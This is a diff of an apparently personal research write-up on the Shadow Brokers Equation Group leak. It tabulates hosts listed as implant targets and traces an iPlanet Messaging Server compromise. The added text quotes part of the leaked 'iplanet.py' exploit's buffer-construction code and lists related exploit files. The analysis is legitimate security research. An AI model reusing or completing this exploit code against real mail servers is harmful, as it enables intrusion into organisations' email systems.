@@ -5,7 +5,7 @@
 The Shadow Brokers Equation Group dump consists of a number of partial dumps.
 
 I am currently looking at the list of compromised hosts (Intonation/Pitchimpair).
-I found a list online which describes some of the implants and what they do:
+I found a list online which describes some of the implants and what they supposedly do:
 
 |Tool name      |functionality           |
 | ------------- | ---------------------- |
@@ -15,7 +15,7 @@ I found a list online which describes some of the implants and what they do:
 |JACKLADDER     |?                       |
 |ORANGUTAN      |?                       |
 |PATCHICILLIN   |?                       |
-|RETICULUM      |                        |
+|RETICULUM      |?                        |
 |SIDETRACK      |implant for PITCHIMPAIR 1)|
 |STOICSURGEON   |Rootkit/Backdoor        |
 
@@ -56,7 +56,7 @@ For this to be true, we would need to see a distinct difference between the "one
 this systems with multiple implants.
 
 To start, I looked at all the "*onesies*" in the `intonation` list, combining historical and current data
-to determine what type of organisations where behind the hosts/IP addresses. For my theory to pan out,
+to determine what type of organizations where behind the hosts/IP addresses. For my theory to pan out,
 these "*onesies*" would have to be prime targets.
 
 Each host with multiple implants would also have to be a lesser-value target for my thesis to hold up.
@@ -107,7 +107,7 @@ Starting with the list of "onesies" as part of the `intonation` "pitch":
 |80.191.2.2|laleh.itrc.ac.ir|incision|20030411-160713|
 
 Working with hostnames/ IP addresses/ whois data/ (scholar.)google.com and archive.org was tricky, 
-because most of the tools of the trade try to be current, not historical. In the end my endeavours resulted in the following list.
+because most of the tools of the trade try to be current, not historical. In the end my endeavors resulted in the following list.
 If you have more or better information, please feel free to contact me.
 
 |hostname|country|vertical(s)|implant type|context                                      |
@@ -137,17 +137,17 @@ If you have more or better information, please feel free to contact me.
 |dns2.net1.it|IT/INT|FINANCE|incision|Probably sub dns of NET1.com. Leading transacting system for billions of unbanked and under-banked people in the world to engage in electronic transactions"|
 |mail-gw.jbic.go.jp|JP|FINANCE|reticulum|Japanse bank for International Cooperation|
 |opserver01.iti.net.pk|PK|IT/TELCO|orangutan|ITILahore, NET.PK ISP in Pakistan|
-|sea.net.edu.cn|CN|EDU|patchicillin|? "non-onsie"?. Actually has 4 implants. A website to VPN into a Chinese educational enviroment|
-|nd11mx1-a-fixed.sancharnet.in|IN|TELCO|orangutan|? "non-onsie"? nd11* seems to be a typo. I can find the ndl* host in old (email) posts on the internet, nd11 only in EQGRP files|
-|ndl1mc1-a-fixed.sancharnet.in|IN|TELCO/ISP|incision|? The above makes this a probable False Positive. BSNL is India's no. 1 Internet service provider with more than 17 lakh (100.000) subscribers, providing Internet service throughout the entire country (except in New Delhi and Mumbai) under the brand name of " Sancharnet"|
-|mail.hangzhouit.gov.cn|CN|GOV/IT|incision|Seems to be a mailserver used by at least some people at College of Computer Science, Zhejiang University, HangZhou. Currently gone.|
+|sea.net.edu.cn|CN|EDU|patchicillin|? "non-onesie"?. Actually has 4 implants. A website to VPN into a Chinese educational enviroment|
+|nd11mx1-a-fixed.sancharnet.in|IN|TELCO|orangutan|? "non-onesie"? nd11* seems to be a typo. I can find the ndl* host in old (email) posts on the internet, nd11 only in EQGRP files|
+|ndl1mc1-a-fixed.sancharnet.in|IN|TELCO/ISP|incision|? The above makes this a probable False Positive, at least as far as *onesies* go. It is, however, an interesting target: BSNL is India's no. 1 Internet service provider with more than 17 lakh (100.000) subscribers, providing Internet service throughout the entire country (except in New Delhi and Mumbai) under the brand name of " Sancharnet"|
+|mail.hangzhouit.gov.cn|CN|GOV/IT|incision|Seems to be a mail server used by at least some people at College of Computer Science, Zhejiang University, HangZhou. Currently gone.|
 |mail.tropmet.res.in|IN|GOV|incision|The Indian Institute of Tropical Meteorology (IITM), Pune, fully devoted to cutting edge research [...] The Institute has excellent infrastructural facilities such as High Performance Computers, observational facilities like RADARS, Radiometers, LIDAR etc., It has a strong link with various universities and national and international organizations. Major research areas at the institute are [...] satellite and radar[...]|
 |smmu-ipv6.smmu.edu.cn|CN|MIL|incision|Second Military Medical University|
-|jur.unn.ac.ru|RU|GOV|stoicsurgeon|? "non-onsie"? European and international law of UNN. I found some articles on scholar.google.com referring to European law, Europe etc. Rather tangent. It seems to be two different OS’es but actually two attacks so might not be relevant. Also, DEWDROP might be C2|
-|jur.unn.ac.ru|RU|GOV|dewdrop|? "non-onsie"? Might be two different OSes on different ports, both owned?|
+|jur.unn.ac.ru|RU|GOV|stoicsurgeon|? "non-onesie"? European and international law of UNN. I found some articles on scholar.google.com referring to European law, Europe etc. Rather tangent. It seems to be two different OS’es but actually two attacks so might not be relevant. Also, DEWDROP might be C2|
+|jur.unn.ac.ru|RU|GOV|dewdrop|? "non-onesie"? Might be two different OSes on different ports, both owned?|
 |unk.vver.kiae.rr|RU|ATOMIC|jackladder|Russian Research Centre "Kurchatov Institute" (Kurchatov Institute of Atomic Energy)|
 |kserv.krldysh.ru|RU|GOV|jackladder|Keldysh Institute of Applied Mathematics (Russian Academy of Sciences) was founded in 1953 to solve complex mathematical problems involved in national projects of space exploration, atomic and thermonuclear energy application, etc.|
-|laleh.itrc.ac.ir|IR|GOV|incision|? "non-onsie" Very interesting target, but multi-powned? ICT Research Institute or IRAN Telecommunication Research Center (ITRC) is the Iranian most experienced research entity in the Information and Communication Technology|
+|laleh.itrc.ac.ir|IR|GOV|incision|? "non-onesie" Very interesting target, but multi-powned? ICT Research Institute or IRAN Telecommunication Research Center (ITRC) is the Iranian most experienced research entity in the Information and Communication Technology|
 
 The most interesting part is that, except for the (for me) unclear one in Korea, all of them point to targets which I could reason are high-value to the NSA.
 But `laleh.itrc.ac.ir` is actually running multiple implants (it seemed a onesie because of the trailing dot in a directory name). So that makes the theory somewhat shaky.
@@ -165,14 +165,14 @@ Lets start by working down from the systems with most implants. Although there a
 #### Initial observations:
 
  1. They all have the same implants
- 2. All files have the same INTONATION function(?) with the same timestamp for all implants
+ 2. All files have the same INTONATION function(?) with the same timestamp for all implants per target
  3. All of them are from 2006
 
 |hostname|country|vertical(s)|implant type|context                                      |
 |:-------|:------|:----------|:-----------|---------------------------------------------|
 |indy.fjmu.edu.cn|CN|UNI|sidetrack patchicillin orangutan jackladder incision dewdrop|Beijing Medical University. Cannot easily establish relevance|
 |ns2.rosprint.ru|RU|TELCO|sidetrack patchicillin orangutan jackladder incision dewdrop|From the archive.org page in 2006: "Equant (rosprint.ru) serves Russian, foreign and transnational companies and banks/state institutions/SME [with] modern, reliable and high-performance telecommunication solution[s]."|
-|ndl1mx1-a-fixed.sancharnet.in|IN||TELCO|idetrack patchicillin orangutan jackladder incision dewdrop|Bharat Sanchar Nigam Limited (abbreviated BSNL) is an Indian state-owned telecommunications company. On 15 September 2000 took over telecom services and network management from Central Government Departments of Telecom Services (DTS) and Telecom Operations (DTO) with effect from 1 October 2000.| 
+|ndl1mx1-a-fixed.sancharnet.in|IN|TELCO|idetrack patchicillin orangutan jackladder incision dewdrop|Bharat Sanchar Nigam Limited (abbreviated BSNL) is an Indian state-owned telecommunications company. On 15 September 2000 took over telecom services and network management from Central Government Departments of Telecom Services (DTS) and Telecom Operations (DTO) with effect from 1 October 2000.| 
 
 #### ndl1mx1-a-fixed.sancharnet.in
 
@@ -196,15 +196,13 @@ Received: from conversion-daemon.bgl1mx1-a-fixed.sancharnet.in by
 bgl1mx1-a-fixed.sancharnet.in
 (iPlanet Messaging Server 5.2 HotFix 1.21 (built Sep  8 2003))
 id <0IYE00FDA1GIWZ at bgl1mx1-a-fixed.sancharnet.in>
-(original mail from aaj-ke-naam at sarai.net); Thu,
-27 Apr 2006 21:23:06 +0530 (IST)
+[...]
 Received: from sarai.net (dd.nic.in [164.100.38.38])
 by bgl1mx1-a-fixed.sancharnet.in
 (iPlanet Messaging Server 5.2 HotFix 1.21 (built Sep  8 2003))
-with ESMTP id <0IYE002PY1GEFN at bgl1mx1-a-fixed.sancharnet.in> for
 ```
 
-But that didn't stop these boys:
+But having no publicly known exploit didn't stop these people. They literally had a working exploit ready for most versions:
 
 ```bash
 grep -Ril iplanet * 2>/dev/null
@@ -225,7 +223,40 @@ EQGRP/archive_files/esna/docs/cleanup_script
 EQGRP/archive_files/esna/iplanet_5_2hf1_21.py
 ```
 
-From https://en.wikipedia.org/wiki/Oracle_Communications_Messaging_Server:
+Starting as it does with "badBytes" the `iplanet.py` script is immediately recognisable as an exploit to anyone who has ever written one.
+
+```python
+1 import time
+  2 import smtpUtils
+  3 import systems
+  4 import utils
+  5
+  6 class iplanet:
+  7    badBytes = [0x0, 0xa, 0xd]
+  8    nAttempts = 1
+  9
+ 10    def buildBaseBuffer(self, imtaBase):
+ 11       filler = utils.buildBuffer(self.baseBufLen, self.badBytes)
+ 12       baseBuf = filler[0x0:]
+ 13       return baseBuf
+ 14
+ 15    def buildBounceBuffer(self):
+ 16       imtaBase = self.imtaBase
+ 17       baseBuf = self.buildBaseBuffer(imtaBase)
+ 18       l7 = (imtaBase + self.l7Imta) + self.l7Offset
+ 19       fp = imtaBase + self.fp
+ 20       filler = utils.buildBuffer(0x18, self.badBytes)
+ 21       bounceBuf = baseBuf \
+ 22                   + utils.stringifyAddr(l7) \
+ 23                   + filler \
+ 24                   + utils.stringifyAddr(fp) \
+ 25                   + utils.stringifyAddr(self.pc - 8)
+ 26       return bounceBuf
+ 27
+```
+
+It seems to be using smtp, so it very much seems like they had (or have) a way of gaining access to a ridiculously often used Enterprise Multi-Tier messaging platform... by sending an email.
+And it probably paid off nicely for these guys to have this 0-day (https://en.wikipedia.org/wiki/Oracle_Communications_Messaging_Server):
 
 ```text
 Oracle Communications Messaging Server is Oracle's messaging (email) server software.
@@ -252,10 +283,14 @@ In addition to the Messaging Server's three parents, the software has undergone 
 The code base has been carried on throughout these minor brand changes with only feature enhancements and bug fixes.
 ```
 
-If I look at the list of typical users, this would have been (is?) a very fruitful 0-day to have.
+I just shudder when I read that last sentence. I hope the guys at Oracle/that which was Sun are paying attention.
+If I look at the list of typical users, this would have been (is?) a very fruitful 0-day to have:
+
+![Oracle Communications Messaging Server](ocm.png)
+
 It will be interesting to find out which other targets might have been compromised this way.
-Additionally of note is that `esna` nor something matching that acronym is found in any of the implant lists.
-This could mean that the initial RCE/0-day is not included in those lists.
+Additionally of note is that I could not find `esna` nor something matching that acronym in any of the implant lists.
+This could mean that the initial RCE/0-day of a target is not included in those lists, although "absence of evidence is not evidence of absence".
 
 
 To be continued ...
@@ -342,7 +377,7 @@ for dir in `bash count.sh | sort -n -r | grep '1 files' | awk '{print $5}'`; do 
 ```
 
 
-## Pitchimpair onsies
+## Pitchimpair onesies
 
 ## targets with eight(8) (registered) implants
 
